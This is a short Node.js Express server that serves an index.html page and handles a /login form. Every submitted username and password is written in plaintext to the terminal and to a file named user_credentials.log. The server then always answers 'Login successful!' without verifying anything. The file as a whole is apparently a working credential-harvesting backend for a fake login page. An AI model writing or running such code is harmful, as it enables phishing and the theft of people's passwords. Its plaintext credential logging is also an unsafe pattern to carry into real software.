const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;
const ipAddress = '192.168.7.173'; // Replace 'YOUR_IP_ADDRESS' with your computer's IP address

// Middleware to parse incoming request bodies
app.use(bodyParser.urlencoded({ extended: false }));

// Serve index.html for the root URL
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Endpoint to handle form submission
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    // Log the username and password to the terminal
    console.log(`Username: ${username}, Password: ${password}`);

    // Log the username and password to a file
    fs.appendFile('user_credentials.log', `Username: ${username}, Password: ${password}\n`, (err) => {
        if (err) throw err;
        console.log('User credentials logged successfully!');
    });

    // Respond to the user
    res.send('Login successful!');
});

app.listen(port, ipAddress, () => {
    console.log(`Server is listening at http://${ipAddress}:${port}`);
});